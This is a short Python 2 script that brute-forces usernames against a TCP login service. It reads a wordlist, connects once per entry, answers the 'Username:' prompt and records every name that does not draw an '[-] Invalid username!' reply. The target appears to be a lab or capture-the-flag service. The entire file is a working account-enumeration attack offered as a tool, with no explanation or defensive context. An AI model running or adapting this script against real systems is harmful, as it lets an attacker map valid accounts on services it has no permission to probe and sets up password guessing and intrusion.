import socket
import sys
import time

valid_usernames = []

if __name__ == "__main__":
	startTime = time.time()

	if len( sys.argv ) > 3:
		host = sys.argv[ 1 ]
		port = int( sys.argv[ 2 ] )
		file = sys.argv[ 3 ]
	else:
		print "Usage python " + sys.argv[ 0 ] + " <host> <port> <dictionary>"
		sys.exit( -1 )

	try:
		fd = open( file, 'r' )
	except:
		print "[-] Error in file open!"
		sys.exit( -2 )

	buf = fd.read().split( '\n' )

	for username in buf:
		if username == '':
			continue

		client = socket.socket()
		client.connect( ( host, port ) )

		data = client.recv( 2048 )

		while "Username: " not in data:
			data = client.recv( 2048 )
		
		client.send( username + "\n" )

		data = client.recv( 1024 )

		if data != "[-] Invalid username!\n":
			print "<%s> is valid username!" % username
			
			if username not in valid_usernames:
				valid_usernames.append( username )

		client.close()

	print "valid usernames = ", valid_usernames
	print "brute time = ", ( time.time() - startTime ), " sec"